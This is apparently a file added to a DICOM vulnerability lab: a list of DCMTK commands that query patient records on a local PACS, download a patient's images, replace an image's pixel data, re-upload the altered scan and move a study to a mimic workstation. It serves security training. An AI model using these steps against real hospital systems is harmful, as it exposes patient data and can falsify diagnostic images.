@@ -1,0 +1,70 @@
+===========================
+Welcome to dicom-vuln-lab :
+===========================
+
+# Offis DICOM Toolkit
+apt info dcmtk
+
+# Connectivity Check
+echoscu -aec DICOM-VULN-LAB localhost 4242  -v
+
+# Retrieves patient info
+findscu -P -aet PROBE -aec DICOM-VULN-LAB localhost 4242 \
+  -k QueryRetrieveLevel=PATIENT -k PatientName= -k PatientID= \
+  -k (0010,0030)= -k PatientSex= 
+
+# Retrieves study info of a patient
+findscu -S -aet PROBE -aec DICOM-VULN-LAB localhost 4242 \
+  -k QueryRetrieveLevel=STUDY -k PatientName=MOCKINGLY^CASEY -k PatientID= \
+  -k StudyDate= -k StudyInstanceUID= -k ModalitiesInStudy= -k StudyID= -k ReferringPhysicianName= -k AccessionNumber=
+
+# Retrievies series info of a patient's study
+findscu -S -aet PROBE -aec DICOM-VULN-LAB localhost 4242 \
+  -k QueryRetrieveLevel=SERIES -k PatientName=MOCKINGLY^CASEY -k PatientID= \
+  -k StudyDate= -k StudyInstanceUID= -k ModalitiesInStudy= -k StudyID=S1 -k ReferringPhysicianName= -k AccessionNumber= -k SeriesInstanceUID=
+ 
+# Retrieves image info from a series
+findscu -S -aet PROBE -aec DICOM-VULN-LAB localhost 4242 \
+  -k QueryRetrieveLevel=IMAGE -k PatientName=MOCKINGLY^CASEY -k PatientID= \
+  -k StudyDate= -k StudyInstanceUID= -k ModalitiesInStudy= -k StudyID=S1 -k ReferringPhysicianName= -k AccessionNumber= -k SeriesInstanceUID=1.2.826.0.1.3680043.8.498.2535789616452253250463632126345259607 -k SOPInstanceUID=
+
+# Downloading all images of a patient (all studies and series)
+getscu -v -P -aet PROBE -aec DICOM-VULN-LAB localhost 4242 \
+  -k QueryRetrieveLevel=PATIENT -k PatientID=TEST1000 \
+  --output-directory ./received
+
+# Downloading specific image
+getscu -v -P -aet PROBE -aec DICOM-VULN-LAB localhost 4242 \
+  -k QueryRetrieveLevel=IMAGE -k SOPInstanceUID=1.2.826.0.1.3680043.8.498.28800313529740051021917230242592825406 \
+  --output-directory ./received
+
+# Get metadata of the DICOM file
+dcmdump <dicom_file>
+
+# Get pixel/image data from the DICOM file
+dcm2img <dicom_file> > output.jpg
+
+# Get raw pixel data from other DICOM file (to replace)
+dcmdump --write-pixel received Downloads/MRBRAIN.DCM 
+  
+# Replace pixel data of existing DICOM file 
+dcmodify -mf "PixelData=received/MRBRAIN.DCM.0.raw" received/MR.1.2.826.0.1.3680043.8.498.28800313529740051021917230242592825406 -v 
+
+# Uploading the modified DICOM file
+storescu -v -aet STORESCU -aec DICOM-VULN-LAB localhost 4242 received/MR.1.2.826.0.1.3680043.8.498.28800313529740051021917230242592825406 
+
+dcmodify -m "StudyDate=20260912" -gst -gse -gin received/MR.1.2.826.0.1.3680043.8.498.28800313529740051021917230242592825406 
+
+# move a study to a mimic AE (delivered to the workstation listener inside the container)
+movescu -v -S -aet PROBE -aec DICOM-VULN-LAB -aem WORKSTN localhost 4242 \
+  -k QueryRetrieveLevel=STUDY -k StudyInstanceUID=1.2.826.0.1.3680043.8.498.71623719141766987925169971212317429246
+
+sudo docker exec -it dicom-vuln-lab /bin/bash
+
+  
+# References:
+DICOM Tag & Dictionary
+https://dicom.nema.org/dicom/2011/11_06pu.pdf
+
+DICOM Viewer
+https://dicomviewer.net/viewer2/localbasic
